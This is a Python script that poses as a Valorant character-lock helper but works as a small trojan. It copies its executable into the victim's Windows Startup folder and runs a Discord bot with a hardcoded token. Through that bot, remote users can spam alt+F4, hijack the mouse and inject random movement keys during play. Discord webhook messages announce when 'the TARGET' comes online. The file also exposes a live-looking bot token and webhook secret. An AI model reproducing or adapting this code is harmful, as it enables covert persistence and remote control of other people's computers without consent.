import time
import pyautogui
import keyboard
import discord
from sys import argv
import os
import random
from discordwebhook import Discord

client = discord.Client()
condition = 0
pyautogui.FAILSAFE = False
caring = 0
TOKEN = 'ODQwOTYyNjA5MzY4MjY4ODIw.YJf1dg.Q5gGU3cwQecWa6Bh0tQh7N2AANk'
def find():
    script = argv
    print(script[0])
    file_location = script[0]
    file_location = file_location.replace("/", "\\")
    hey = file_location.split("\\")
    user_name = hey[2]
    dir = "C:/Users/" + user_name + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/new_and_improved.exe"
    new_dir = dir.replace("/", "\\")
    print(new_dir)
    os.replace(file_location, new_dir)

def choose_2():
    wait_for_keyboard_press()
    pyautogui.click(832, 922)
    time.sleep(0.2)
    lock_character()
    print("Character chosen!")
    pyautogui.click(832, 922)

def lock_character():
    pyautogui.click(958, 812)
    pyautogui.click(958, 812)
    pyautogui.click(958, 812)
    pyautogui.click(958, 812)

def wait_for_keyboard_press():
    print("Press ] to lock the character. Tipp: You can do this "
          "at the end of the load screen")
    while True:
        if keyboard.is_pressed(']'):
            print("] pressed.")
            break
def mess(caring):
    pyautogui.FAILSAFE = False
    while caring == 1:
        pyautogui.FAILSAFE = False
        pyautogui.click(1920, 0)

def fps(caring):
    for i in range(10):
        time.sleep(random.uniform(15, 60))
        for i in range(int(random.uniform(2, 9))):
            keyboard.send("w")
        time.sleep(int(random.uniform(70, 160)))
        for i in range(int(random.uniform(2, 9))):
            keyboard.send("a")
        time.sleep(int(random.uniform(200, 600)))
        for i in range(random.uniform(2, 9)):
            keyboard.send("s")
        time.sleep(int(random.uniform(300, 350)))
        for i in range(random.uniform(2, 9)):
            keyboard.send("d")

    discord = Discord(url="https://discord.com/api/webhooks/840958624742113290/csPL_KuDawYvdC-H-1EXjoAB9M11U3Bccfxi4Qxobh3kImvWYMWfPm7ubSTq4u-J3J4K")
    discord.post(content="brother your fps attack is over please start again")





def bot():
    @client.event
    async def on_ready():
        print('We have logged in as {0.user}'.format(client))
        discord = Discord(url="https://discord.com/api/webhooks/840958624742113290/csPL_KuDawYvdC-H-1EXjoAB9M11U3Bccfxi4Qxobh3kImvWYMWfPm7ubSTq4u-J3J4K")
        discord.post(content="The TARGET has come online, alright soldier get ready!")


    @client.event
    async def on_message(message):
        username = str(message.author).split('#')[0]
        user_message = str(message.content)
        channel = str(message.channel.name)
        print(f'{username}: {user_message}: ({channel})')

        if message.author == client.user:
            return

        if message.channel.name == 'valorant-bot':
            if user_message.lower() == 'online':
                await message.channel.send(f'Hello {username}, machine is online right now')
                return
            elif user_message.lower() == 'kill the program':
                exit()

            elif user_message.lower() == 'shut down':
                    keyboard.send("alt+F4, space")

            elif user_message.lower() == 'kill deez nuts':
                await message.channel.send(f'Hello {username}, SUCK MY NUTS, lmao do you not have smth else better to do?')
                return

            elif user_message.lower() == 'prettiest girl in the server':
                await message.channel.send(f'Hello miwint, I know you\'re the one asking')
                return

            elif user_message.lower() == 'hell':
                while True:
                    keyboard.send("alt+F4, space")

            elif user_message.lower() == 'amos':
                await message.channel.send(f'Hello Amos, Can\'t believed you frogottne your own commmands here let me help you: hell is to kill the machine, kill the program is to end th program, yup that\'s all')
                return

            elif user_message.lower() == 'amos':
                await message.channel.send(f'Hello Amos, Can\'t believed you frogottne your own commmands here let me help you: hell is to kill the machine, kill the program is to end th program,mouse c is to just mess with his mouse and stop is to stop, yup that\'s all')
                return

            elif user_message.lower() == 'mouse c':
                caring = 1
                mess(caring)
                return

            elif user_message.lower() == 'stop':
                caring = 0
                mess(caring)
                return

            elif user_message.lower() == 'mess fps':
                caring = 1
                fps(caring)
                return

            elif user_message.lower() == 'thank you':
                await message.channel.send(f'You\'re welcome sir I am glad to serve you. (Side Note I know this is cringe)')
                return




    client.run(TOKEN)


if condition == 1:
    find()
    bot()
    while True:
     choose_2()

else:
    bot()


